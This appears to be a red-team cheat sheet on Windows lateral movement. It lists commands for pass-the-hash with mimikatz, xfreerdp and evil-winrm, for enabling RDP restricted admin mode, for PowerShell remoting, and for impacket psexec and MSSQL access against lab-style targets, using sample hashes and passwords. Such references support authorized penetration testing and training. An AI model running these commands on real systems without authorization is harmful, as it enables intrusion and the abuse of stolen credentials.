---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/lateral-movement/remote-access
---

# Remote Access

## Remote Desktop

If we only have the password hash, we can still use it for remote desktop if we enable restricted admin mode.

```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

On Windows, it required to perform PTH with **mimikatz**

{% code overflow="wrap" %}
```powershell
mimikatz.exe
privilege::debug
sekurlsa::pth /user:administrator /domain:vulnableone /ntlm:9e7c6b33d9a2dfc1c9aef53eb2837b32 /run:"mstsc.exe /restrictedadmin"
```
{% endcode %}

### xfreeRDP

```bash
xfreerdp /v:10.10.10.10 /u:administrator /w:1820 /h:768 /cert-ignore
xfreerdp /v:10.10.10.10 /u:administrator /cert-ignore /pth:4f9163ca3b673adfff2828f368ca3763
xfreerdp /v:10.10.10.10 /u:administrator /w:1820 /h:768 /d:vulnableone.local +clipboard
```

### mshta on Windows

```powershell
mstsc.exe /RestrictedAdmin /v:$hostname
mstsc.exe /v:$hostname
```

### rdesktop

```bash
rdesktop 10.10.10.10 -u admin -p password -d vulnableone.local
rdesktop -g 95% -u khan.chanthou -p Password123 10.10.10.10 -x m -P -z
```

### Winrs Access

```powershell
C:\> winrs -r:pp-mgmt cmd
```

### PSSession Remoting

```powershell
PS C:\> $mgmt = New-PSSession pp-mgmt
PS C:\> Enter-PSSession $mgmt

PS C:\> Enter-PSSession -ComputerName FileServer -ConfigurationName j_sk12

PS C:\> $cred = Get-Credential
PS C:\> Enter-PSSession -ComputerName 10.10.10.10 -Authentication Negotiate -Credential $cred
```

### ScriptBlock

```powershell
Invoke-Command -ScriptBlock {hostname;whoami} -ComputerName pp-mgmt
```

### Evil-WinRM

```bash
evil-winrm -i $ip -u khan.chanthou -p Password123!
evil-winrm -i $ip -u khan.chanthou -H 89a3a7550ce8c505c2d46b5e39d6f802
```

### Impacket

```python
# PSExec
impacket-psexec vulnableone/khan.chanthou@10.10.10.10 -hashes :1b951bc4fdc5dfcd148161420b9c6207
impacket-psexec vulnableone/khan.chanthou@10.10.10.10
impacket-psexec vulnableone.local/administrator@10.10.10.10 -k -no-pass
PsExec.exe -accepteula \\pp-dc.vulnableone.local cmd

# MSSQL
impacket-mssqlclient -windows-auth vulnableone/sqlsvc@10.10.10.10
impacket-mssqlclient sql01.vulnableone.local -k
impacket-mssqlclient sa:SecureSecret@10.10.10.10
```
